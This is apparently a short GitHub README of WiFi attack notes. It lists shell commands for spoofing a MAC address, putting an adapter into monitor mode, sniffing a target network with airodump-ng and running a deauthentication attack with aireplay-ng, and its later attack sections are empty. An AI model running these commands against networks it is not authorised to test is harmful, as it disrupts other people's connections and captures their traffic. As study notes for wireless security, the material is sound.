# Projet-WiFi

* Pre-connection attacks, gaining access & post-connection attacks on WEP, WPA & WPA2.

### Prerequisites
0. Linux + wireless adapter.

1. Change the MAC address of your wireless adapter, either for hiding a computer on a network or for allowing it to impersonate another network device.

```
ifconfig wireless_adapter_name down
ifconfig wireless_adapter_name hw ether 00:19:35:89:88:14
ifconfig wireless_adapter_name up
```

2. Change your wireless interface to "Monitor" mode. By default, the mode of wireless devices is set to "Managed", that means our wireless device will only capture packets that have our device's MAC address as the destination MAC.

```
ifconfig wireless_adapter_name down
airmon-ng check kill (kill all interference processes)
iwconfig wireless_adapter_name mode monitor
ifconfig wireless_adapter_name up
iwconfig
```

### Pre-connection attacks
1. Discover networks around you:
```
airodump-ng wireless_adapter_name
```
![Discover networks around you](https://user-images.githubusercontent.com/64968597/134020395-c7a67e4b-d7d0-4a84-a155-8a67fdf449c9.JPG)

2. Sniff packet from a specified network:
```
airodump-ng --bssid target_MAC --channel N (--write file_name) wireless_adapter_name
```

3. Deauthentification attack (disconnect any device from the network):

This attack will always work ! The only way around it is to change the MAC address on the target machine.
```
aireplay-ng --deauth time_out -a router_addr -c target_mac_addr wireless_adapter_name
```
 

✔️ 




### Gaining access

### Post-connection attacks

✔️
